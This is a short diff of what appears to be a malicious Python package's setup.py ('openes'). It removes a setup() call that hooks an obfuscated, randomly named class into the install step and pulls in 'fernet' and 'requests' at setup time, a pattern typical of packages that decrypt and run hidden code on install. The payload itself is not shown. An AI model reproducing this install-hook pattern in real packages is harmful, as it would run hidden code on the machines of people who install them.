@@ -18,22 +18,5 @@ class MNxnTBwwlzHBEMwfMLOKPYEFSPjurwOZnkmakPhZbtNvUBvOKWsuYbQvPXJsLTgPFwpRqfWsMr
             install.run(self)
 
 
-setup(
-    name="openes",
-    version=VERSION,
-    author="EIzkRuNHFEUcAsjfQu",
-    author_email="CoBTAlP@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': MNxnTBwwlzHBEMwfMLOKPYEFSPjurwOZnkmakPhZbtNvUBvOKWsuYbQvPXJsLTgPFwpRqfWsMrCzTugCQVjTtisbiscwuxoctoUsnLJqDTclnOcnhABQJWHuIdgOXtAsLDniCppADSNjbcqqTdjfGKBQEjIoNImjLVXWfatgZxywqxKRJlurfAxiMOhMOSxUCAQsKLEM,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
